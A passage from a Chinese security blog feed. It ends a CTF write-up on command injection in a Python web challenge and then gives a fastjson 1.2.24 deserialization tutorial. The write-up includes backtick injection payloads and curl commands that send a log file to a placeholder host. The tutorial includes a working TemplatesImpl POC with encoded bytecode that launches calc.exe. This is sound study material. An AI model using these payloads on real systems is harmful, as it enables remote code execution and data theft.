class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure><p>可以看到我们可控的其实就是一个<code>num</code>参数，因为它有<code>eval</code>，所以说我感觉可以尝试ssti，但它过滤的属实太多了，就懒得绕，于是我看到了下面的<code>os.system(log)</code>，这里可以直接执行命令，只不过命令内容我们不完全可控，<code>echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt</code>，我们只有2的位置可控，不过也不影响，加个反引号就可以了，看下面这个测试：</p><p><img src="https://s2.loli.net/2022/03/28/52qb98EFWokZcVe.png" alt="image.png"></p><p>说明它是完全可以执行的，并且把命令执行的结果写进了<code>./tmp/log.txt</code>中，这里我感觉很奇怪的就是这个文件<code>./tmp/log.txt</code>我们无法直接访问到，可能是<code>python</code>路由的问题，但不能直接访问我们可以通过<code>curl</code>把数据外带出来嘛，这里空格被ban了我们用<code>%09</code>代替就行</p><p>也就是说我们先执行命令，命令执行的结果在<code>./tmp/log.txt</code>中，然后<code>curl</code>外带出来看，记得这里用burp抓下包在里面传，别直接传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令：123%23`ls%09/`%23</span><br><span class="line">外带数据：123%23`curl%09-F%09xx=@tmp/log.txt%09http://ip:port/`%23</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/4fo8mBcWr9XwOig.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令：123%23`cat%09/T*`%23</span><br><span class="line">外带数据：123%23`curl%09-F%09xx=@tmp/log.txt%09http://ip:port/`%23</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/SRo1jsmp2MtnGkV.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/28/jrA6Th9zdL3HaeP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2022DASCTF-X-SU-三月挑战赛&quot;&gt;&lt;a href=&quot;#2022DASCTF-X-SU-三月挑战赛&quot; class=&quot;headerlink&quot; title=&quot;2022DASCTF X SU 三月挑战赛&quot;&gt;&lt;/a&gt;2022DASCTF X SU 三月挑战赛&lt;/h1&gt;&lt;p&gt;这次的&lt;code&gt;DASCTF&lt;/code&gt;挺难受的，比赛的时候只打出了一道web，web2其实是能出的，比赛的时候钻进死胡同里去了，而且太久没打比赛了手感也不是很好，这个比赛当恢复训练了，接下来就把这两道web题的wp写写&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之fastjson反序列化</title>
    <link href="https://arsenetang.github.io/2022/03/26/Java%E7%AF%87%E4%B9%8Bfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2022/03/26/Java%E7%AF%87%E4%B9%8Bfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-03-25T16:00:00.000Z</published>
    <updated>2022-03-26T12:59:19.982Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h1><p>接下来我们来学习<code>Java</code>中的另一种反序列化，也是非常常见的一种，<code>fastjson</code>反序列化</p><span id="more"></span><h2 id="fastjson是啥"><a href="#fastjson是啥" class="headerlink" title="fastjson是啥"></a>fastjson是啥</h2><p><code>fastjson</code>是阿里巴巴的开源<code>Json</code>解析库，它可以解析<code>Json</code>格式的字符串，快速将<code>Json</code>与<code>Java Bean</code>对象相互转换，相当于就是一个<code>JSON</code>处理器，可以将<code>Java Bean</code>对象<strong>序列化</strong>为<code>JSON</code>字符串，也可以从<code>JSON</code>字符串<strong>反序列化</strong>到<code>JavaBean</code>对象</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>首先还是得用<code>maven</code>来添加一波依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>然后写一个<code>JavaBean</code>类吧，直接用我之前那个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;Arsene.Tang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">18</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们创建这个对象，并且把它序列化为<code>Json</code>格式输出出来看看</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        People peo = <span class="keyword">new</span> People();</span><br><span class="line">        String Json = JSON.toJSONString(peo);</span><br><span class="line">        System.out.println(Json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/13/oQmd9ZfF8C56Irg.png" alt="image.png"></p><p>可以看到，这就是一个<code>Json</code>格式的字符串，而且它是通过<code>getter</code>方法来获取字段的值的</p><p>还有一种序列化的方式，就是多设置一个属性值，设置过后在序列化后会多写入一个<code>@type</code>，即写上被序列化的类名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        People peo = <span class="keyword">new</span> People();</span><br><span class="line">        String Json = JSON.toJSONString(peo, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(Json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/14/zUmh1OJaH5v6wDT.png" alt="image.png"></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>在<code>fastjson</code>中，用于反序列化的函数主要是下面两个：<code>parse</code>和<code>parseObject</code></p><p><code>parse</code>用的不太多，<code>public static final Object parse(String text); </code>将<code>JSON</code>文本反序列化为一个<code>JSONObject</code>对象：</p><p><img src="https://s2.loli.net/2022/03/13/iaR9p2PX1DMsWkx.png" alt="image.png"></p><p>那我们怎么才能返回一个<code>People</code>对象呢，这时候就需要用到<code>parseObject</code>方法了，这个方法有非常多种，根据参数的不同，返回的类型也不太同，有兴趣的朋友可以去<code>idea</code>里面去看，因为确实太多了我就不妨这儿了，这里就讲几个比较常见的：</p><p>1.<code>public static final JSONObject parseObject(String text);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject)obj;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (JSONObject)toJSON(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;can not cast to JSONObject.&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的返回值和<code>parse</code>一样，都是一个<code>JSONObject</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        People peo = <span class="keyword">new</span> People();</span><br><span class="line">        String Json = JSON.toJSONString(peo);</span><br><span class="line">        JSONObject obj = JSON.parseObject(Json);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">        System.out.println(obj.get(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">        System.out.println(obj.get(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/13/tPjpS76nIKlUwzH.png" alt="image.png"></p><p>2.<code>public static final &lt;T&gt; T parseObject(String text, Class&lt;T&gt; clazz)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">parseObject</span><span class="params">(String input, Type clazz, <span class="keyword">int</span> featureValues, Feature... features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Feature[] var4 = features;</span><br><span class="line">        <span class="keyword">int</span> var5 = features.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var5; ++var6) &#123;</span><br><span class="line">            Feature feature = var4[var6];</span><br><span class="line">            featureValues = Feature.config(featureValues, feature, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(input, ParserConfig.getGlobalInstance(), featureValues);</span><br><span class="line">        T value = parser.parseObject(clazz);</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法就挺重要的，它可以把<code>JSON</code>文本反序列化为<code>JavaBean</code>对象，而这个类是我们可以指定的，它就是<code>clazz</code>，我们就可以把它反序列化成<code>People</code>对象了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        People peo = <span class="keyword">new</span> People();</span><br><span class="line">        String Json = JSON.toJSONString(peo);</span><br><span class="line">        Object obj = JSON.parseObject(Json,People.class);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">        People peo1 = (People) obj;</span><br><span class="line">        System.out.println(peo1.getAge());</span><br><span class="line">        System.out.println(peo1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/13/xWREt3IzGP5eng4.png" alt="image.png"></p><h2 id="调用getter"><a href="#调用getter" class="headerlink" title="调用getter"></a>调用getter</h2><p>在<code>fastjson</code>中，有一个<code>autotype</code>功能，只要<code>json</code>的字符串中有<code>@type</code>属性，那么它的值就会被反序列化成指定的类型，为了方便看清它调用了哪些方法，我们在<code>setter</code>和<code>getter</code>里面都加上一句输出，然后假如我们调用<code>parseObject</code>方法，并且里面有<code>@type</code>属性的时候，它就会调用<code>getter</code>方法，看下图：</p><p><img src="https://s2.loli.net/2022/03/13/inEKqbScmyYPVUs.png" alt="image.png"></p><p>可以看到它调用了<code>setter</code>和<code>getter</code>，那么假如<code>get</code>或<code>set</code>方法中存在恶意操作，那么这样就可以触发了</p><p>既然有了<code>getter</code>我们就想到CB链中的调用<code>TemplatesImpl#getOutputProperties()</code>加载字节码的故事了</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>我们还是先给出<code>POC</code>，然后再来分析它的利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String json=<span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;Code\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(json, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实思路是很清晰的，利用它反序列化后会调用<code>getter</code>方法，调用到<code>TemplatesImpl</code>类的<code>getOutputProperties</code>方法，然后触发利用链，加载字节码，虽然说思路如此，但想要仔细去推敲它的原理，其实也不是很容易</p><p><img src="https://s2.loli.net/2022/03/24/bOgJHPpNvUI8ayo.png" alt="image.png"></p><p>首先就是<code>_name</code>属性和<code>_tfactory</code>属性都是私有属性，而且没有<code>public</code>的<code> setter</code>方法，所以说要利用这个漏洞就多了一个条件，那就是得开启<code>Feature.SupportNonPublicField</code>才能使用，所以说我们在<code>parseObject</code>中加上了这句话</p><p>我们先来看看几个属性：</p><ol><li><strong>@type</strong>：指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，<code>Fastjson</code>根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性</li><li><strong>_bytecodes</strong>：是我们把恶意类的<code>.class</code>文件二进制格式进行base64编码后得到的字符串</li><li><strong>_outputProperties</strong>：漏洞利用链的关键会调用其参数的<code>getOutputProperties</code>方法 导致命令执行</li><li><strong>_tfactory</strong>：我们要先将<code>_tfactory</code>设置为空，也就是一个空的<code>object</code>，因为当赋值的值为一个空的Object对象时，会新建一个需要赋值的字段应有的格式的新对象实例</li><li><strong>_name</strong>：反正需要这个字段，值无所谓，为空也行</li></ol><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>利用链实在是太长了，全写出来显得很啰嗦，我就只把关键的点写出来：</p><p>首先它会进入到<code>JSON</code>类中的<code>parseObject()</code>方法，然后在里面会调用到<code>parse()</code>方法，注意看它的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text, Feature... features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject)parse(text, features);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, Feature... features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> featureValues = DEFAULT_PARSER_FEATURE;</span><br><span class="line">        Feature[] var3 = features;</span><br><span class="line">        <span class="keyword">int</span> var4 = features.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            Feature feature = var3[var5];</span><br><span class="line">            featureValues = Feature.config(featureValues, feature, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> parse(text, featureValues);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后在<code>Feature.config</code>里面做了一手赋值，将<code>Feature</code>赋值为<code>SupportNonPublicField</code></p><p><img src="https://s2.loli.net/2022/03/26/epY2MUdBmzcDZ8T.png" alt="image.png"></p><p>然后再调进<code>parse</code>中，在这里创建了一个<code>DefaultJSONParser</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">            Object value = parser.parse();</span><br><span class="line">            parser.handleResovleTask(value);</span><br><span class="line">            parser.close();</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>DefaultJSONParser</code>里面，发现它创建了一个<code>JSONScanner</code>对象，继续跟进：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DefaultJSONParser</span><span class="params">(String input, ParserConfig config, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(input, <span class="keyword">new</span> JSONScanner(input, features), config);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>JsonScanner</code>就是起到一个扫描器的作用，它会扫描字符串，直到字符队尾，然后再做匹配：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JSONScanner</span><span class="params">(String input, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(features);</span><br><span class="line">        <span class="keyword">this</span>.text = input;</span><br><span class="line">        <span class="keyword">this</span>.len = <span class="keyword">this</span>.text.length();</span><br><span class="line">        <span class="keyword">this</span>.bp = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">this</span>.next();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.ch == <span class="string">&#x27;\ufeff&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.next();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">charAt</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="keyword">this</span>.len ? <span class="string">&#x27;\u001a&#x27;</span> : <span class="keyword">this</span>.text.charAt(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = ++<span class="keyword">this</span>.bp;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ch = index &gt;= <span class="keyword">this</span>.len ? <span class="string">&#x27;\u001a&#x27;</span> : <span class="keyword">this</span>.text.charAt(index);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于我们字符串的第一位是<code>&#123;</code>，那么它的匹配就会进入到下面这个分支：</p><p><img src="https://s2.loli.net/2022/03/26/BEgczNsXDYo25Vl.png" alt="image.png"></p><p>将<code>token</code>赋值为12，所以说在接下来的<code>switch case</code>中，会进入到下面这个分支中：</p><p><img src="https://s2.loli.net/2022/03/26/vIAkR8SdqVONw5c.png" alt="image.png"></p><p>可以看到在这里新建了一个<code>JSONObject</code>对象，而这个<code>JSONObject</code>对象是一个<code>HashMap</code>：</p><p><img src="https://s2.loli.net/2022/03/26/NSdml9IGOrMvPuo.png" alt="image.png"></p><p>然后进入到<code>parseObject()</code>方法中，再往后取下一位，假如下一位是<code>&quot;</code>的话，则取它的字段，我们这里正好就是，于是取出<code>@</code></p><p><img src="https://s2.loli.net/2022/03/26/tXfoUwKGbFumN2y.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/26/olRDqkrW7OU3s4c.png" alt="image.png"></p><p>按照这种方法一位一位的取，直到取到下一个<code>&quot;</code>，取到了<code>@type</code>，这个就是<code>key</code>，然后进入到下一个判断中：</p><p><img src="https://s2.loli.net/2022/03/26/smFZxTvXrBiboJD.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/26/pXPFcyMQ6sLRT58.png" alt="image.png"></p><p>进入到这里：</p><p><img src="https://s2.loli.net/2022/03/26/xcEGBWuVCvkXpiT.png" 